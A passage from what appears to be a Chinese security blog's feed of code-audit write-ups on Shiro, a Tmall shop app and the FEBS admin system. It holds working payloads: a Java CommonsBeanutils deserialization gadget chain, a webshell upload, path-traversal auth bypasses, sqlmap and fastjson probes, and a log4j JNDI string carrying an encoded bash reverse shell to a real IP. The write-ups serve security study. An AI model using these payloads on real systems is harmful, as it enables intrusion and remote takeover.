class_">TransformerFactoryImpl</span>());<br><br>    <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>);<br><br>    <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>    <span class="hljs-comment">// 传入一个没有用的比较器</span><br>    PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br><br>    queue.add(templates);<br>    queue.add(<span class="hljs-number">1</span>);<br><br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PriorityQueue</span>&gt; queueClass = queue.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">sizeFiled</span> <span class="hljs-operator">=</span> queueClass.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>    sizeFiled.setAccessible(<span class="hljs-literal">true</span>);<br>    sizeFiled.set(queue,<span class="hljs-number">2</span>);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">comparatorFiled</span> <span class="hljs-operator">=</span> queueClass.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>    comparatorFiled.setAccessible(<span class="hljs-literal">true</span>);<br>    comparatorFiled.set(queue,beanComparator);<br><br><br>    SerializeUtil.serialize(queue);<br>    SerializeUtil.unSerialize();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(Object object, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(filedName);<br>    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    declaredField.set(object, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>传参后发送，发现报错，如下：</p><p><img src="/./../../public/blog_image/image-20240401095727365.png" alt="image-20240401095727365"></p><p>原因：</p><blockquote><p>如果两个不同版本的库使用了同一个类，而这两个类可能有一些方法和属性有了变化，此时在序列化通信的时候就可能因为不兼容导致出现隐患。因此，Java在反序列化的时候提供了一个机制，序列化时会根据固定算法计算出一个当前类的 <code>serialVersionUID</code> 值，写入数据流中；反序列化时，如果发现对方的环境中这个类计算出的 <code>serialVersionUID</code> 不同，则反序列化就会异常退出，避免后续的未知隐患。</p></blockquote><p>那我们就修改版本，和shiro一样的版本，将版本修改为<code>1.8.3</code>。</p><p>修改后我再打！发现又报错了：</p><p><img src="/./../../public/blog_image/image-20240401100401447.png" alt="image-20240401100401447"></p><p>这段的意思是，不能加载cc依赖中的<code>ComparableComparator</code>，因为cb在设计之初就依赖cc链。</p><p>可以看到<code>BeanComparator</code>的构造函数，传入了一个cc链的<code>ComparableComparator</code>。</p><p><img src="/./../../public/blog_image/image-20240401100556082.png" alt="image-20240401100556082"></p><p>那么我们不要这个依赖cc链的构造函数，换成其他的就行了。</p><p>查看另一个构造函数，我们可以传入jdk原生的比较器，或者其他比较器就可以了。</p><p><img src="/./../../public/blog_image/image-20240401100652020.png" alt="image-20240401100652020"></p><p>以上的类都可以考虑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">read_file</span>(<span class="hljs-params">file_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf8&#x27;</span>) <span class="hljs-keyword">as</span> file:  <span class="hljs-comment"># 指定使用 gbk 编码打开文件</span><br>        content = file.readlines()<br>    <span class="hljs-comment"># 返回文件内容的集合，使用集合去除重复项</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">set</span>(content)<br><br><span class="hljs-comment"># 两个文件的路径</span><br>file1_path = <span class="hljs-string">&#x27;compart.txt&#x27;</span><br>file2_path = <span class="hljs-string">&#x27;serializable.txt&#x27;</span><br><br><span class="hljs-comment"># 读取文件内容</span><br>file1_content = read_file(file1_path)<br>file2_content = read_file(file2_path)<br><br><span class="hljs-comment"># 找到两个文件内容的交集</span><br>intersection = file1_content.intersection(file2_content)<br><br><span class="hljs-comment"># 打印交集内容</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;文件1和文件2的交集:&quot;</span>)<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> intersection:<br>    <span class="hljs-built_in">print</span>(item.strip())  <span class="hljs-comment"># 去除换行符并打印交集内容</span><br><br></code></pre></td></tr></table></figure><p><img src="/./../../public/blog_image/image-20240401101950406.png" alt="image-20240401101950406"></p><p>就用第一个了：</p><p><img src="/./../../public/blog_image/image-20240401102113366.png" alt="image-20240401102113366"></p><p>修改poc，new一个<code>AttrCompare</code>的比较器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>    <span class="hljs-type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Language\\Java\\java_code\\Security\\serialize\\cc3\\target\\classes\\Calc.class&quot;</span>));<br>    setFiled(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);<br>    setFiled(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;bytes&#125;);<br>    setFiled(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>    <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br><br>    <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>    <span class="hljs-comment">// 传入一个没有用的比较器</span><br>    PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br><br>    queue.add(templates);<br>    queue.add(<span class="hljs-number">1</span>);<br><br>    Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">PriorityQueue</span>&gt; queueClass = queue.getClass();<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">sizeFiled</span> <span class="hljs-operator">=</span> queueClass.getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>    sizeFiled.setAccessible(<span class="hljs-literal">true</span>);<br>    sizeFiled.set(queue,<span class="hljs-number">2</span>);<br><br>    <span class="hljs-type">Field</span> <span class="hljs-variable">comparatorFiled</span> <span class="hljs-operator">=</span> queueClass.getDeclaredField(<span class="hljs-string">&quot;comparator&quot;</span>);<br>    comparatorFiled.setAccessible(<span class="hljs-literal">true</span>);<br>    comparatorFiled.set(queue,beanComparator);<br><br><br>    SerializeUtil.serialize(queue);<br>    SerializeUtil.unSerialize();<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFiled</span><span class="hljs-params">(Object object, String filedName, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Field</span> <span class="hljs-variable">declaredField</span> <span class="hljs-operator">=</span> object.getClass().getDeclaredField(filedName);<br>    declaredField.setAccessible(<span class="hljs-literal">true</span>);<br>    declaredField.set(object, value);<br>&#125;<br></code></pre></td></tr></table></figure><p>本地测试可以弹出计算器，试试在shiro中，成功回显。</p><p><img src="/./../../public/blog_image/image-20240401102307116.png" alt="image-20240401102307116"></p><h1 id="坑点："><a href="#坑点：" class="headerlink" title="坑点："></a>坑点：</h1><p>这里使用插件可以查看到存在cc依赖，如图所示：</p><p><img src="/./../../public/blog_image/image-20240326175825039.png" alt="image-20240326175825039"></p><p>但是在maven中test不会被编译进去的。这里可以打cb：</p><p><img src="/./../../public/blog_image/image-20240326175855543.png" alt="image-20240326175855543"></p>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>shiro</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tmail代码审计</title>
    <link href="/2024/04/15/Tmail%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/04/15/Tmail%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="配置环境："><a href="#配置环境：" class="headerlink" title="配置环境："></a>配置环境：</h1><h1 id="前台："><a href="#前台：" class="headerlink" title="前台："></a>前台：</h1><h2 id="1-xss："><a href="#1-xss：" class="headerlink" title="1.xss："></a>1.xss：</h2><h3 id="前台搜索xss："><a href="#前台搜索xss：" class="headerlink" title="前台搜索xss："></a>前台搜索xss：</h3><p>访问:<code>vps:8088/tmall/</code>前台服务，搜索处存在xss。</p><p><img src="/./../blog_image/image-20240226101005227.png" alt="image-20240226101005227"></p><h3 id="用户信息修改xss："><a href="#用户信息修改xss：" class="headerlink" title="用户信息修改xss："></a>用户信息修改xss：</h3><p><img src="/./../blog_image/image-20240226102710525.png" alt="image-20240226102710525"></p><p>提交后，后台管理处可以弹出xss。</p><p><img src="/./../blog_image/image-20240226102635489.png" alt="image-20240226102635489"></p><p>之后我们可以利用xss接受平台接受信息。</p><p>不会利用。</p><h2 id="2-文件上传："><a href="#2-文件上传：" class="headerlink" title="2.文件上传："></a>2.文件上传：</h2><p>用户个人信息修改中存在任意文件上传。</p><p>上传后的文件路径在：</p><p><code>/tmall/res/images/item/userProfilePicture/文件名</code>目录下</p><p><img src="/./../blog_image/image-20240227094443059.png" alt="image-20240227094443059"></p><p>直接bp抓包后放行，没有过滤后缀：</p><p><img src="/./../blog_image/image-20240227100354405.png" alt="image-20240227100354405"></p><p>默认密码是<code>rebeyond</code></p><p><img src="/./../blog_image/image-20240227100727481.png" alt="image-20240227100727481"></p><p>实现逻辑中没有对上传的文件后缀进行过滤。</p><p><img src="/./../blog_image/image-20240227100935616.png" alt="image-20240227100935616"></p><h1 id="后台："><a href="#后台：" class="headerlink" title="后台："></a>后台：</h1><h2 id="1-登陆权限绕过："><a href="#1-登陆权限绕过：" class="headerlink" title="1.登陆权限绕过："></a>1.登陆权限绕过：</h2><p>在获取用户信息中，我们需要管理员进行登录操作，才能查看的，如下图：</p><p><img src="/./../blog_image/image-20240227135353622.png" alt="image-20240227135353622"></p><p>将cookie删除了就会重定向登陆页面：</p><p><img src="/./../blog_image/image-20240227135424814.png" alt="image-20240227135424814"></p><p>一般项目中都会在filter中做权限校验，要么在struct中做权限校验，查看filter拦截器：</p><p><img src="/./../blog_image/image-20240227135535811.png" alt="image-20240227135535811"></p><p>主要获取当前url然后判断url中是否存在<code>/admin/login</code>或者是<code>/admin/account</code>目录，如果存在则放行，不存在校验权限。</p><p>因此我们可以知道存在<code>/admin/login</code>或者是<code>/admin/account</code>目录的都会被放行。</p><p>这个时候我们可以尝试使用<code>../..</code>的方式去绕过。如<code>/xxx/../aa/bb</code>这样的目录，tomcat接收到的实际路径是<code>/aa/bb</code>，这就能够直接绕过filter的权限校验了。</p><p>因此我们可以构造payload：<code>/admin/login/../../tmall/admin/user</code>，这样就会被解析成<code>/tmall/admin/user</code>，这就可以绕过filter的校验了。</p><p><strong>SpringBoot(Tomcat)和Shiro对URL处理的差异化</strong></p><table><thead><tr><th>漏洞编号</th><th>CVE-2020-1957</th><th>CVE-2020-11989</th><th>CVE-2020-13933</th></tr></thead><tbody><tr><td>影响版本</td><td>Apache Shiro &lt; 1.5.1</td><td>Apache Shiro &lt; 1.5.2</td><td>Apache Shiro &lt; 1.6</td></tr><tr><td>payload</td><td>&#x2F;xxxx&#x2F;..;&#x2F;admin&#x2F;</td><td>&#x2F;;&#x2F;test&#x2F;admin&#x2F;page</td><td>&#x2F;admin&#x2F;;page</td></tr><tr><td>Shrio 处理结果</td><td>&#x2F;xxxx&#x2F;..</td><td>&#x2F;</td><td>&#x2F;admin&#x2F;</td></tr><tr><td>SpringBoot 处理结果</td><td>&#x2F;admin&#x2F;</td><td>&#x2F;admin&#x2F;page</td><td>&#x2F;admin&#x2F;;page</td></tr></tbody></table><p>这表中对于<code>CVE-2020-1957</code>我们的路径是<code>/xxx/..;/admin/</code>，那么shiro实际获取的参数是<code>/xxxx/..</code>，而springboot获取的实际参数是<code>/admin</code>，这样我们就饶过了shiro层，从而路由到springboot对应的controller层了，这样就绕过了权限校验。</p><h2 id="2-查询sql注入："><a href="#2-查询sql注入：" class="headerlink" title="2.查询sql注入："></a>2.查询sql注入：</h2><p>一般的springboot都可能会存在的注入点：</p><blockquote><ol><li>order by</li><li>like</li></ol></blockquote><p>like预防的措施是<code>concat(&#39;$&#39;,参数，&#39;$&#39;)</code></p><p><img src="/./../blog_image/image-20240227140351119.png" alt="image-20240227140351119"></p><p>选择文件掩码为<code>*.xml</code>，然后搜索<code>$&#123;</code>为未预编译的。</p><p><img src="/./../blog_image/image-20240227141914964.png" alt="image-20240227141914964"></p><p>往上查找：</p><p><img src="/./../blog_image/image-20240227141929940.png" alt="image-20240227141929940"></p><p>查找到对应的controller：</p><p><img src="/./../blog_image/image-20240227142008592.png" alt="image-20240227142008592"></p><p>找到orderby字段是可控的。</p><p>可以直接上sqlmap：</p><p>使用<code>-p</code>指定<code>orderBy</code>参数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">py .\sqlmap.py -u <span class="hljs-string">&quot;http://127.0.0.1:8088/tmall/admin/reward/0/10?orderBy=1&quot;</span> --cookie=<span class="hljs-string">&quot;JSESSIONID=096556EF4FC62BBE700F04AC75D3E587; username=admin&quot;</span> -p <span class="hljs-string">&quot;orderBy&quot;</span> --current-db<br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20240227143553007.png" alt="image-20240227143553007"></p><p>还有很多的注入点，方法类似，主要是从dao层网上查找，需要注意的是orderby字段是否是可控的。</p><h2 id="3-管理员头像文件上传："><a href="#3-管理员头像文件上传：" class="headerlink" title="3.管理员头像文件上传："></a>3.管理员头像文件上传：</h2><p>和前台一样。</p><p>但是这里需要知道的是正常来说，Springboot项目是不能够解析JSP文件的，这里能够解析，是因为引入了jstl和jasper依赖。所以，对于前后端分离的springboot项目，即使上传了马子，也没办法解析。</p><h2 id="4-fastjson组件漏洞："><a href="#4-fastjson组件漏洞：" class="headerlink" title="4.fastjson组件漏洞："></a>4.fastjson组件漏洞：</h2><p>查找到使用fastjson的地方，搜索<code>json.parse</code></p><p>payload如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.Inet6Address&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;sdffsd.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;name&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetAddress&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;1247.xxxxx.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br><br><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;@type&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;java.net.InetSocketAddress&quot;</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;address&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;val&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;wefewffw.dnslog.cn&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><img src="/./../blog_image/image-20240227150241688.png" alt="image-20240227150241688"></p><p>成功收到dns：</p><p><img src="/./../blog_image/image-20240227150146555.png" alt="image-20240227150146555"></p><p>但是以上payload只能证明fastjson出网，无法判断fastjson是否存在反序列化漏洞，因为最新的打了补丁的fastjson也是能发起DNS请求的。这是很多新手，误以为能DNS出网，就认为存在fastjson漏洞，这是不正确的。</p><h2 id="5-log4j2漏洞："><a href="#5-log4j2漏洞：" class="headerlink" title="5.log4j2漏洞："></a>5.log4j2漏洞：</h2><p>全文搜索<code>logger.</code></p><p>在文件上传中可以找到：</p><p><img src="/./../blog_image/image-20240229100100998.png" alt="image-20240229100100998"></p><p>dnslog检测：</p><p><img src="/./../blog_image/image-20240227155008357.png" alt="image-20240227155008357"></p><p><img src="/./../blog_image/image-20240227155013754.png" alt="image-20240227155013754"></p><p>本地使用工具：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -jar JNDIExploit-1.2-SNAPSHOT.jar -i vps的ip<br></code></pre></td></tr></table></figure><p>然后传入参数：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$&#123;jndi:ldap://x.x.x.x:1389/Basic/Command/Base64/base64编码后的命令&#125;</span><br></code></pre></td></tr></table></figure><p>即：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$&#123;jndi:ldap://47.96.111.156:1389/Basic/Command/Base64/L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ3Ljk2LjExMS4xNTYvNTU1NSAwPiYx&#125;</span><br></code></pre></td></tr></table></figure><p>vps上监听5555端口</p><p>重新发送数据包</p><p><img src="/./../blog_image/image-20240229100322670.png" alt="image-20240229100322670"></p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
      <tag>代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>FEBS后台管理系统代码审计</title>
    <link href="/2024/03/17/FEBS%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2024/03/17/FEBS%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="环境准备："><a href="#环境准备：" class="headerlink" title="环境准备："></a>环境准备：</h1><h2 id="下载源码："><a href="#下载源码：" class="headerlink" title="下载源码："></a>下载源码：</h2><p>下载文件<a href="https://github.com/jackliu-hao/shiro_boot----">jackliu-hao&#x2F;shiro_boot—-: shiro_boot代码审计 (github.com)</a></p><h2 id="Oracle安装："><a href="#Oracle安装：" class="headerlink" title="Oracle安装："></a>Oracle安装：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it -p 1521:1521 \--name oracle11g \registry.cn-hangzhou.aliyuncs.com/helowin/oracle_11g <br></code></pre></td></tr></table></figure><p>进入容器<code>docker exec oracle_11g -it bash </code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#进入容器</span><br>su root  <span class="hljs-comment">#密码 helowin</span><br><span class="hljs-comment">#编辑profile文件配置ORACLE环境变量:</span><br>vi /etc/profile  <br><span class="hljs-comment">#添加如下内容</span><br><span class="hljs-built_in">export</span> ORACLE_HOME=/home/oracle/app/oracle/product/11.2.0/dbhome_2export ORACLE_SID=helowinexport PATH=<span class="hljs-variable">$ORACLE_HOME</span>/bin:<span class="hljs-variable">$PATH</span>  <br><span class="hljs-comment">#更新环境变量</span><br><span class="hljs-built_in">source</span> /etc/profile  <br><span class="hljs-comment">#创建软连接：</span><br><span class="hljs-built_in">ln</span> -s <span class="hljs-variable">$ORACLE_HOME</span>/bin/sqlplus /usr/bin <br><span class="hljs-comment">#切换到oracle</span><br>su - oracle<br><span class="hljs-comment">#登录sqlplus并修改sys、system用户密码</span><br>sqlplus /nolog                                                 <span class="hljs-comment"># 登录oracle</span><br>conn /as sysdba                                                <span class="hljs-comment"># 连接,需要进行操作系统验证，才可进行连接登录</span><br>alter user system identified by [你的密码];                     <span class="hljs-comment"># 修改system用户账号密码</span><br>alter user sys identified by [你的密码];                            <span class="hljs-comment"># 修改sys用户账号密码</span><br>ALTER PROFILE DEFAULT LIMIT PASSWORD_LIFE_TIME UNLIMITED;      <span class="hljs-comment"># 修改密码规则策略为密码永不过期</span><br><span class="hljs-built_in">exit</span>;                                                          <span class="hljs-comment"># 退出</span><br></code></pre></td></tr></table></figure><p> oralce的其他命令：</p><blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;<span class="hljs-comment">#补充命令</span><br>&gt;<span class="hljs-comment">#登录sqlplus并修改sys、system用户密码: 需要注意的是再oracle用户下操作</span><br>&gt;sqlplus /nolog                                      <span class="hljs-comment"># 登录</span><br>&gt;conn /as sysdba                                     <span class="hljs-comment"># 连接</span><br>&gt;create user <span class="hljs-built_in">test</span> identified by <span class="hljs-built_in">test</span>;                <span class="hljs-comment"># 创建内部管理员账号密码；</span><br>&gt;grant connect,resource,dba to yan_test;             <span class="hljs-comment"># 将dba权限授权给内部管理员账号和密码；</span><br>&gt;alter system <span class="hljs-built_in">set</span> processes=1000 scope=spfile;       <span class="hljs-comment"># 修改数据库最大连接数据；#修改以上信息后，需要重新启动数据库</span><br>&gt;shutdown immediate;                                 <span class="hljs-comment"># 关闭数据库</span><br>&gt;startup;                                            <span class="hljs-comment"># 启动数据库</span><br>&gt;<span class="hljs-keyword">select</span> instance from v<span class="hljs-variable">$thread</span>;                      <span class="hljs-comment"># 查看数据库sid(实例名)</span><br>&gt;clear SCR  或 clear screen 或 clea scre              <span class="hljs-comment"># sqlplus清屏命令#创建表空间</span><br>&gt;create tablespace pts datafile <span class="hljs-string">&#x27;/home/oracle/app/oracle/oradata/helowin/pts.dbf&#x27;</span> size 100m autoextend on next 10m<br>&gt;drop tablespace PTS;                                <span class="hljs-comment"># 删除表空间</span><br>&gt;<span class="hljs-keyword">select</span> tablespace_name from dba_tablespaces;        <span class="hljs-comment"># 查看所有表空间</span><br>&gt;create user PTS identified by PTS default tablespace PTS;  <span class="hljs-comment"># 创建用户</span><br>&gt;drop user pts cascade;                              <span class="hljs-comment"># 删除用户</span><br>&gt;SQL&gt; grant sysdba to sys;                           <span class="hljs-comment"># 为sys用户添加sysdba权限</span><br>&gt;<span class="hljs-keyword">select</span> * from dba_role_privs <span class="hljs-built_in">where</span> granted_role=<span class="hljs-string">&#x27;DBA&#x27;</span>; <span class="hljs-comment"># 查看哪些用户被授予DBA权限</span><br>&gt;SQL&gt; <span class="hljs-keyword">select</span> userenv(<span class="hljs-string">&#x27;language&#x27;</span>) from dual;          <span class="hljs-comment"># 查看数据库编码</span><br></code></pre></td></tr></table></figure></blockquote><h2 id="Oracle连接："><a href="#Oracle连接：" class="headerlink" title="Oracle连接："></a>Oracle连接：</h2><p>当执行了上面的命令，修改system用户密码为system后，查看数据库的sid（实例名）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">select</span> instance from v<span class="hljs-variable">$thread</span>;<br></code></pre></td></tr></table></figure><p>idea连接：<code>jdbc:oracle:thin:@[host]:[port]:[sid]</code></p><p>如图所示：</p><p><img src="/./../blog_image/image-20240316101955227.png" alt="image-20240316101955227"></p><p>连接即可。</p><h1 id="审计："><a href="#审计：" class="headerlink" title="审计："></a>审计：</h1><h2 id="1-验证码复用："><a href="#1-验证码复用：" class="headerlink" title="1. 验证码复用："></a>1. 验证码复用：</h2><h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a>漏洞复现：</h3><p><img src="/./../blog_image/image-20240316103739741.png" alt="image-20240316103739741"></p><p>抓包后修改账号和密码发现验证码存在复用情况，因此可以尝试爆破出账号和密码。</p><p>我们还看到登录中选择记住我后，存在<code>rememberMe</code>字段，因此可以推断出使用了shiro的鉴权中间件。</p><h3 id="代码审计："><a href="#代码审计：" class="headerlink" title="代码审计："></a>代码审计：</h3><p>查看登录接口：</p><p><img src="/./../blog_image/image-20240316114434386.png" alt="image-20240316114434386"></p><p>主要是调用了生成验证码接口后保存在session中，在登陆的时候尝试获取session中的验证码然后进行比较。</p><p>如果验证码错误则直接跳出，返回验证码错误了，而不是重新刷新验证码。正确的做法是使当前验证码失效，然后抛出错误，重新调用验证码接口。</p><h2 id="2-druid泄露："><a href="#2-druid泄露：" class="headerlink" title="2. druid泄露："></a>2. druid泄露：</h2><p>访问<code>/druid/index.html</code>，存在无需登录即可访问druid管理后台。</p><p>一般登录账号密码是<code>druid</code>，<code>druid123</code>。</p><p><img src="/./../blog_image/image-20240316115305210.png" alt="image-20240316115305210"></p><p>由于这里使用了shiro的session来管理，而不是使用request中的session，因此点击session监控是查看不到当前保存的session的。</p><p>如果获取了session，可以保存所有session，然后使用burp进行爆破，可以尝试无感知登录。</p><h2 id="3-shiro中间件漏洞："><a href="#3-shiro中间件漏洞：" class="headerlink" title="3. shiro中间件漏洞："></a>3. shiro中间件漏洞：</h2><h3 id="shiro反序列化rce："><a href="#shiro反序列化rce：" class="headerlink" title="shiro反序列化rce："></a>shiro反序列化rce：</h3><p>看到<code>rememberMe</code>直接梭哈：</p><p><img src="/./../blog_image/image-20240316135506959.png" alt="image-20240316135506959"></p><p>直接梭哈成功：</p><p><img src="/./../blog_image/image-20240316135522553.png" alt="image-20240316135522553"></p><h3 id="未授权访问："><a 